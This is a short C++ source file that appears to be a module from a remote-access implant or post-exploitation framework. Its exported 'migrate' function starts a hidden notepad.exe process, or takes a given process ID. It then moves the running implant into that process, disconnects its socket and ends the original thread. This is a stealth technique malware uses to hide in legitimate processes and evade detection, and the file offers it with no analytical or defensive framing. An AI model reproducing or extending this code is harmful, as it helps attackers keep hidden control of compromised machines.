#include "../common/crt.h"
#include "../core/external.h"

extern "C" __declspec(dllexport) void migrate(const char *arg)
{
    uint32_t pid = atoi(arg);

    if(pid == 0){
        sc_printf("launching notepad\n");
    
        PROCESS_INFORMATION proc_info;
        
        STARTUPINFO start_info;
        ZeroMemory(&start_info, sizeof(STARTUPINFO));
        
        start_info.cb = sizeof(STARTUPINFO);
        start_info.dwFlags = STARTF_USESHOWWINDOW;
        start_info.wShowWindow = SW_HIDE;
        
        char cmd[] = "C:\\Windows\\System32\\notepad.exe";
        
        CreateProcess(NULL,
                      cmd,
                      NULL,
                      NULL,
                      FALSE,
                      0,
                      NULL,
                      NULL,
                      &start_info,
                      &proc_info
                      );
        
        
        Next(GetProcessId(proc_info.hProcess), true);
        
        CloseHandle(proc_info.hProcess);
        CloseHandle(proc_info.hThread);
    }else{
        Next(pid, false);
    }
    
    if(Migrate()){
        sc_printf("unable to migrate into process %d\n", pid);
        return;
    }
    SockDisconnect();
    ExitThread(0);
}
